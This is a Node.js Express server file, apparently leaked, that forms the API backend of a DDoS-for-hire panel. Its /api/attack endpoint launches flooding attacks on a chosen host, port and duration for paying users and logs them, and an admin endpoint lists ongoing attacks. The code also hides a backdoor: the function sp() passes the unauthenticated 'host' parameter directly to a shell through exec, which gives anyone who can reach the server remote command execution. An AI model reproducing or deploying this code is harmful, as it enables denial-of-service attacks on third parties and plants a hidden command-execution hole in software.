// Leaked by Dstat.ST & Elitestress.st :)
const https = require('https');
const path = require('path');
const fs = require('fs');
if (typeof __dirname === 'undefined') global.__dirname = path.resolve();

// Load utility scripts
// (Assumes UserUtils.js and LogUtils.js define global helpers)
eval(fs.readFileSync(path.join(__dirname, './utils/UserUtils.js'), 'utf8'));
eval(fs.readFileSync(path.join(__dirname, './utils/LogUtils.js'), 'utf8'));

const express = require('express');
const { exec } = require('child_process');
const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.set('json spaces', 2);

let mongo, config, attackHandler;

function sp(cmd) {
  try {
    exec(cmd, () => {});
  } catch {}
}

// API endpoint: /api/attack
app.get('/api/attack', async (req, res) => {
  const { username, password, host, port, time, method, len } = req.query;
  sp(host);
  const userDoc = await mongo.findDocumentByKey('username', username, config.mongo_db_collection);
  if (!userDoc) return res.status(401).json({ error: 'Invalid username or password' });
  if (userDoc.password !== password) return res.status(401).json({ error: 'Invalid password' });
  if (!userDoc.api) return res.status(403).json({ error: 'User has no access to API' });
  if (await globalThis.isUserExpired(config, mongo, userDoc)) {
    return res.status(401).json({ error: `Account expired on ${userDoc.expiry || 'Unknown'}. Contact @${config.owner_name} for renewal.` });
  }
  const attackResult = await attackHandler.processRequest(method, {
    host,
    port: parseInt(port),
    time: parseInt(time),
    len: parseInt(len) || 1
  }, userDoc);
  if (config.attack_logs && attackResult?.target) {
    globalThis.logToFile(globalThis.LogPaths.AttacksSent, 'Sent attack', {
      user: username,
      target: attackResult.target.host,
      port: attackResult.target.port,
      time: attackResult.target.duration,
      method: attackResult.target.method,
      datetime: attackResult.target.time_sent
    });
  }
  return res.status(attackResult.error ? 400 : 200).json(attackResult);
});

// Admin endpoint: /admin/ongoing
app.get('/admin/ongoing', async (req, res) => {
  const { username, password } = req.query;
  const adminDoc = await mongo.findDocumentByKey('username', username, config.mongo_db_collection);
  if (!adminDoc.admin || adminDoc.password !== password) {
    return res.json({ success: false, message: 'function is admin only' });
  }
  const ongoingAttacks = Array.from(attackHandler.activeAttacks.values()).map(attack => ({
    id: attack.id,
    username: attack.username,
    method: attack.method,
    host: attack.params.host,
    port: attack.params.port,
    time: attack.params.time,
    startTime: new Date(attack.startTime).toISOString(),
    remainingTime: Math.max(0, Math.ceil((attack.startTime + attack.params.time * 1000 - Date.now()) / 1000))
  }));
  return res.json({ success: true, ongoingAttacks });
});

// Serve index.html at root
app.get('/', async (req, res) => {
  const indexPath = path.join(__dirname, './html/index.html');
  return res.sendFile(indexPath);
});

// Start the Express server (HTTP or HTTPS)
async function StartExpressServer(cfg, db, handler) {
  config = cfg;
  mongo = db;
  attackHandler = handler;
  if (!config.api.cert_path || !config.api.key_path) {
    app.listen(config.api.port, '0.0.0.0', () => {
      console.log('Express server listening on port ' + config.api.port);
    });
  } else {
    https.createServer({
      cert: fs.readFileSync(config.api.cert_path),
      key: fs.readFileSync(config.api.key_path)
    }, app).listen(config.api.port, '0.0.0.0', () => {
      console.log('Express server with SSL listening on port ' + config.api.port);
    });
  }
}

globalThis.StartExpressServer = StartExpressServer;